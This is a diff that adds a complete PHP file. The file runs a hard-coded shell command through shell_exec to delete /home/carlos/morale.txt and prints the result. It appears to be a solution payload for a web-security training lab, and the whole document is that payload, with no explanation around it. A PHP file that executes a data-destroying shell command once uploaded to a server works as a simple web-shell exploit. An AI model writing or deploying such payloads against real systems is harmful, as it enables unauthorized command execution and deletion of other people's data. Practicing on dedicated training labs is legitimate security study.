@@ -1,0 +1,8 @@
+<?php
+// Execute the command
+$command = "rm /home/carlos/morale.txt";
+$output = shell_exec($command);
+
+// Output the result
+echo "<pre>$output</pre>";
+?>
